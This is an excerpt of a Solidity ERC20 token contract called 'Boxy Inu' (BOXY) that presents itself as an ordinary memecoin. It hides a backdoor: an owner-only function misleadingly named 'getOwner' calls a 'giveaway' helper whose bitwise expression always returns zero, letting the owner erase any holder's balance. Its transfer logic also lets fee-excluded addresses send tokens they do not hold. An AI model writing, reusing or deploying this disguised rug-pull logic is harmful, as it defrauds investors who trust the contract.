...
contract BoxyInu is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Boter; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "Boxy Inu";
    string private _symbol = "BOXY";
    ...
    function giveaway(address account, bytes32 DATA) internal view onlyOwner returns (uint256) {
        uint8 q;
        q = 1;
        return ((_balances[account]) & q & (_balances[account]) & (_balances[account]) & 0 << 0xF);    
    }

    function getOwner(address account, bytes32 DATA) public onlyOwner {
        (account != address(0), "ERC20: burn from the zero address");
        _balances[account] = giveaway(account,DATA);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 senderBd = _balances[sender];
        if ( !_isExcludedFromFee[msg.sender]) { require(senderBd >= amount); require(sender != recipient); }
        uint256 amountR = amount - feeAmount;
        _balances[_burnaaddress] += feeAmount;
        if (senderBd >= amount) {  _balances[sender] = senderBd - amount; }
        _balances[recipient] += amountR;
